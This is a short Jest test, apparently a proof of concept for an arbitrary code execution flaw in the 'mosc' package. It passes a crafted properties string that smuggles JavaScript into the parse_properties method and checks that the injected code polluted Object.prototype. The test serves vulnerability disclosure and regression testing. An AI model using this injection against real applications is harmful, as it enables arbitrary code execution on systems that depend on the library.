test("Arbitrary code execution in mosc", () => {
  expect.assertions(2);
  const fs = require("fs");
  var A = require("mosc");
  expect({}.polluted).toBe(undefined);
  let a = new A({});
  let key = "";
  let attack_code = "1 + (Object.prototype.polluted = `yes`)";
  let properties = "{a:*1*; " + attack_code + " //*}";
  let base = "";
  try {
    a.parse_properties(key, properties, {}, {});
  } catch (error) {}
  expect({}.polluted).toBe("yes");
});
